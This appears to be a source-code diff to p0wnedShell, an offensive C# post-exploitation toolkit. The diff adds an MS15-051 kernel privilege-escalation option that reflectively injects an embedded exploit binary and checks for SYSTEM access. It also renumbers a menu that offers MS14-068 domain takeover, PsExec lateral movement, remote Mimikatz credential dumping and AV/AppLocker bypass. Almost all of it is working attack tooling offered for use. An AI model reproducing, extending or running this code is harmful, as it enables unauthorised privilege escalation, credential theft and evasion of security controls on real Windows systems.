@@ -38,6 +38,7 @@ using System.IO;
 using System.Net;
 using System.Text;
 using System.Linq;
+using System.Globalization;
 using System.Reflection;
 using System.IO.Compression;
 using System.Collections.Generic;
@@ -209,25 +210,27 @@ namespace p0wnedShell
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Exploitation:\n");
             Console.ResetColor();
-            Console.WriteLine(" 8. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
+            Console.WriteLine(" 8. Get into Ring0 using the MS15-051 Vulnerability.");
+            Console.WriteLine();
+            Console.WriteLine(" 9. Own AD in 60 seconds using the MS14-068 Kerberos Vulnerability.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Lateral Movement:\n");
             Console.ResetColor();
-            Console.WriteLine(" 9. Use PsExec to execute commands on remote system.");
+            Console.WriteLine(" 10. Use PsExec to execute commands on remote system.");
             Console.WriteLine();
-            Console.WriteLine(" 10. Execute Mimikatz on a remote computer to dump credentials.");
+            Console.WriteLine(" 11. Execute Mimikatz on a remote computer to dump credentials.");
             Console.WriteLine();
-            Console.WriteLine(" 11. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
+            Console.WriteLine(" 12. PowerCat our PowerShell TCP/IP Swiss Army Knife.");
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("[*] Others:\n");
             Console.ResetColor();
-            Console.WriteLine(" 12. Execute PowerShell Commands (Including PowerSploit and Veil's PowerTools Post Exploitation Modules).");
+            Console.WriteLine(" 13. Execute PowerShell Commands (Including PowerSploit and Veil's PowerTools Post Exploitation Modules).");
             Console.WriteLine();
-            Console.WriteLine(" 13. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
+            Console.WriteLine(" 14. Reflectively load a ReactOS Command shell into Memory, bypassing AV/AppLocker.");
             Console.WriteLine();
-            Console.WriteLine("\n 14. Exit");
+            Console.WriteLine("\n 15. Exit");
             Console.Write("\nEnter choice: ");
             var result = Console.ReadLine();
 
@@ -319,6 +322,9 @@ namespace p0wnedShell
                         }
                         break;
                     case 8:
+                        Pshell.MS15_051();
+                        break;
+                    case 9:
                         if (Arch == "x86")
                         {
                             Pshell.MS14_068();
@@ -332,7 +338,7 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 9:
+                    case 10:
                         if (Arch == "x86")
                         {
                             Pshell.PsExec();
@@ -346,16 +352,16 @@ namespace p0wnedShell
                             Console.ReadLine();
                         }
                         break;
-                    case 10:
+                    case 11:
                         Pshell.Remote_Mimikatz();
                         break;
-                    case 11:
+                    case 12:
                         PowerCat.PowerMenu();
                         break;
-                    case 12:
+                    case 13:
                         Pshell.InvokeShell();
                         break;
-                    case 13:
+                    case 14:
                         if (Arch == "x86")
                         {
                             Pshell.ReactShell();
@@ -376,12 +382,84 @@ namespace p0wnedShell
                         break;
                 }
 
-            } while (userInput != 14);
+            } while (userInput != 15);
         }
     }
 
     public class Pshell
     {
+
+        public static class EnvironmentHelper
+        {
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetCurrentProcess();
+
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetModuleHandle(string moduleName);
+
+            [DllImport("kernel32")]
+            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32.dll")]
+            static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
+
+            public static bool Is64BitOperatingSystem()
+            {
+                // Check if this process is natively an x64 process. If it is, it will only run on x64 environments, thus, the environment must be x64.
+                if (Is64BitProcess())
+                    return true;
+                // Check if this process is an x86 process running on an x64 environment.
+                IntPtr moduleHandle = GetModuleHandle("kernel32");
+                if (moduleHandle != IntPtr.Zero)
+                {
+                    IntPtr processAddress = GetProcAddress(moduleHandle, "IsWow64Process");
+                    if (processAddress != IntPtr.Zero)
+                    {
+                        bool result;
+                        if (IsWow64Process(GetCurrentProcess(), out result) && result)
+                            return true;
+                    }
+                }
+                // The environment must be an x86 environment.
+                return false;
+            }
+
+            public static bool Is64BitProcess()
+            {
+                return IntPtr.Size == 8;
+            }
+
+            [DllImport("ntdll.dll")]
+            private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);
+
+            [StructLayout(LayoutKind.Sequential)]
+            internal struct RTL_OSVERSIONINFOEX
+            {
+                internal uint dwOSVersionInfoSize;
+                internal uint dwMajorVersion;
+                internal uint dwMinorVersion;
+                internal uint dwBuildNumber;
+                internal uint dwPlatformId;
+                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
+                internal string szCSDVersion;
+            }
+
+            public static decimal RtlGetVersion()
+            {
+                RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
+                osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
+                //const string version = "Microsoft Windows";
+                if (RtlGetVersion(out osvi) == 0)
+                {
+                    string Version = osvi.dwMajorVersion + "." + osvi.dwMinorVersion;
+                    return decimal.Parse(Version, CultureInfo.InvariantCulture);
+                }
+                else
+                {
+                    return -1;
+                }
+            }
+        }
 
         private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();
 
@@ -1236,6 +1314,97 @@ namespace p0wnedShell
             {
                 Console.WriteLine(e.Message);
             }
+        }
+
+        public static void MS15_051()
+        {
+            string[] toPrint = { "* Get into Ring0 using the MS15-051 Vulnerability.                  *" };
+
+            Program.PrintBanner(toPrint);
+
+            string osArch = "x86";
+            if (EnvironmentHelper.Is64BitOperatingSystem())
+            {
+                osArch = "x64";
+            }
+
+            string procArch = "x86";
+            if (EnvironmentHelper.Is64BitProcess())
+            {
+                procArch = "x64";
+            }
+
+            //detect if the correct architecture is being used
+            if (procArch != osArch)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[+] Your OS Architectecture does not match the version of p0wnedShell you run.");
+                Console.WriteLine("[+] To run this Exploit, you should run the " + osArch + " version of p0wnedShell\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+                return;
+            }
+
+            OperatingSystem OS = System.Environment.OSVersion;
+            string LatestOSVersion = "6.3";
+            decimal latestOSVersionDec = decimal.Parse(LatestOSVersion, CultureInfo.InvariantCulture);
+            if (EnvironmentHelper.RtlGetVersion() > latestOSVersionDec)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[+] MS15-051 is only exploitable on Windows 8.1/2012 R2 or lower.\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+                return;
+            }
+
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine("This Exploit can only succeed when patch KB3045171 is not installed on this system.\n");
+            Console.ResetColor();
+            Console.Write("[+] Please wait until loaded...\n");
+            Console.WriteLine();
+
+            string MS15_051 = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.MS15_051(osArch) + "\" -split ' ') -Verbose";
+            try
+            {
+                P0wnedListener.Execute(MS15_051);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+            string Whoami = "whoami";
+            string SystemPower = null;
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("\n[+] let's check if our exploit succeeded:\n");
+            Console.ResetColor();
+            try
+            {
+                SystemPower = RunPSCommand(Whoami);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            if (SystemPower.IndexOf("system", 0, StringComparison.OrdinalIgnoreCase) != -1)
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("[+] The Ring has awoken, it’s heard its masters call :)\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue and Get The Party Started...");
+                Console.ReadLine();
+            }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("[+] Exploit failed, System probably already patched!\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+            }
+            return;
         }
 
         public static void PsExecShell(string Hostname)
